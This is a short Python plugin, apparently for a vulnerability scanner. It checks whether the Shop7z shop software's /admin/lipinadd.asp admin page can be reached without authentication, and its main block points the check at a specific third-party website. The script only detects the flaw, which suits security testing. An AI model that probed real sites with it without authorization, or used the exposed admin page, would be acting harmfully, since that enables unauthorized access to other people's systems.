#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Shop7z /admin/lipinadd.asp越权访问
import re

def assign(service, arg):
    if service == "shop7z":
        return True, arg

def audit(arg):
    payload = 'admin/lipinadd.asp'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target) 
    if  code == 200 and 'name="lipinname"' in res and 'name="showflag"' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('shop7z', 'http://www.99ysbjw.com/')[1])